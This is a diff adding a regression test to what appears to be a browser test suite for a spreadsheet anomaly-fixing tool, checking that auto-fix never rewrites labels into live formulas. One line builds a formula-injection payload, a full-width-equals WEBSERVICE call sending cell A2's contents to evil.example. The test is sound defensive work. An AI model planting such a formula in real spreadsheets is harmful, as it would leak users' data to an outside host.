@@ -785,6 +785,19 @@ if (mode === "flow") {
   ok((await c11()) === -5 && !(await page.isVisible("#fix-care")), "Undo again: the cells are back and the failure leaves the card");
   await page.click("#fix-back");
 
+  // 7f) AH-160: a label typed as a formula with a full-width ＝ (Excel reads it as =) got a capitals fix, and auto-fix
+  // wrote ＝WEBSERVICE(...) into the sheet with no Accept. The engine offers no such fix, so auto-fix writes nothing
+  const evil = (w) => `＝${w}("https://evil.example/?"&A2)`;
+  await page.evaluate((rows) => __load("Evil", rows), [["Label", "N"], ...Array.from({ length: 10 }, (_, k) => [evil("WEBSERVICE"), k]),
+    [evil("webservice"), 10], ...Array.from({ length: 10 }, (_, k) => ["Other", 11 + k])]);
+  await page.evaluate(() => localStorage.setItem("anomalyHunterAutoFix", "1"));
+  const w7f = await page.evaluate(() => __log.length);
+  await page.click("#scan"); await idle();
+  await page.evaluate(() => localStorage.setItem("anomalyHunterAutoFix", "0"));
+  ok((await page.evaluate((n) => __log.slice(n).filter((w) => w[0] === "write" && w[1] === "Evil").length, w7f)) === 0
+    && (await page.evaluate(() => __cell("Evil", "A12").v)) === evil("webservice"),
+    "auto-fix never writes a label Excel would read as a formula - " + (await text("#notice")));
+
   // 8) an empty sheet gets a plain message, not an error
   await page.evaluate(() => __load("Empty", [["only a header"]]));
   await page.click("#scan"); await idle();
